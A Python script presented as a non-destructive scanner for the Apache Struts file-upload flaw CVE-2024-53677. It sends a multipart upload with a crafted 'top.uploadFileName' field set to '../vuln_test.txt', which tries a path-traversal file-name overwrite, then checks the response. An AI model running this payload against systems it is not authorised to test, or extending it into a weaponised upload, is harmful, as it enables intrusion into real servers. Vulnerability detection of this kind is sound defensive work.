import requests
import argparse
import logging
from urllib.parse import urljoin
from requests_toolbelt.multipart.encoder import MultipartEncoder
import random


'''
import requests
import logging
import http.client

http.client.HTTPConnection.debuglevel = 1

logging.basicConfig()
logging.getLogger().setLevel(logging.DEBUG)
requests_log = logging.getLogger("requests.packages.urllib3")
requests_log.setLevel(logging.DEBUG)
requests_log.propagate = True


proxies = {
	'http' : 'http://127.0.0.1:8080',
	'https' : 'http://127.0.0.1:8080',
}
'''
proxies = None

# Configure logging
logging.basicConfig(
	level=logging.INFO,
	format="%(asctime)s [%(levelname)s] %(message)s",
	handlers=[logging.StreamHandler()]
)

def detect_vulnerability(target_url, upload_endpoint):
	"""
	Non-destructive detection of CVE-2024-53677.
	"""
	logging.info("Starting detection for CVE-2024-53677 (S2-067)...")
	upload_url = urljoin(target_url, upload_endpoint)
	test_filename = "../vuln_test.txt"
	harmless_content = "S2-067 detection test."

	# Attempt to overwrite file name using OGNL binding
	files = {
		"Upload": ("test.txt", harmless_content, "text/plain"),
		"top.uploadFileName": test_filename  # Attempt filename overwrite
	}

	# Custom Content-Type boundary
	boundary = "----WebKitFormBoundary" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16))
	m = MultipartEncoder(fields=files, boundary=boundary)
	headers = {
		"User-Agent": "Mozilla/5.0",
		"Content-Type": m.content_type
	}

	logging.info(f"Sending test request to upload endpoint: {upload_url}")

	try:
		# Send file upload request
		response = requests.post(upload_url, headers=headers, data=m, timeout=10 , proxies = proxies)

		print( response.text )

		# Analyze HTTP response
		if response.status_code == 200:
			logging.info("[INFO] File upload request succeeded.")
			if "vuln_test.txt" in response.text:
				logging.warning("[ALERT] File name overwrite detected. Target may be vulnerable!")
			else:
				logging.info("[INFO] Target does not appear vulnerable.")
		elif response.status_code in [403, 401]:
			logging.info("[INFO] Access denied. Ensure proper permissions.")
		else:
			logging.info(f"[INFO] Unexpected HTTP response: {response.status_code}")
	except requests.exceptions.RequestException as e:
		logging.error(f"[ERROR] Request failed: {e}")

def main():
	parser = argparse.ArgumentParser(description="CVE-2024-53677 (S2-067) Non-destructive Detection Tool")
	parser.add_argument("-u", "--url", required=True, help="Target base URL (e.g., http://example.com)")
	parser.add_argument("--upload_endpoint", required=True, help="Path to file upload endpoint (e.g., /upload.action)")
	args = parser.parse_args()

	logging.info("Starting detection process...")
	detect_vulnerability(args.url, args.upload_endpoint)
	logging.info("Detection process completed.")

if __name__ == "__main__":
	main()
